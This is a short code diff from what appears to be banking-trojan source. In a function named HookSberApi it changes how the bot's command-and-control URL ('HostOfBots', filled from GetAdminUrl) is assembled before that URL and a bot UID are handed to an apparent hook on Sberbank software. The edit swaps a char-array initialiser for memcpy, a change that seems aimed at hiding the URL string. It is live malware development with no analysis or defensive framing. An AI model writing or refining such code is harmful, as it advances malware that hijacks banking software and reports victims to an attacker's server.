@@ -216,7 +216,9 @@ static bool HookSberApi()
 		return 0;		
 	}
 	
-	char HostOfBots[128] = {'h','t','t','p',':','/','/', 0};
+	char HostOfBots[128];
+	const char http[] = {'h','t','t','p',':','/','/', 0};
+	m_memcpy( HostOfBots, http, 8 );
 	GetAdminUrl( HostOfBots + 7 );
 	SetParamsSBR( HostOfBots, UID );
 	DBG( "Sber", "передаем хост %s и UID %s", HostOfBots, UID );
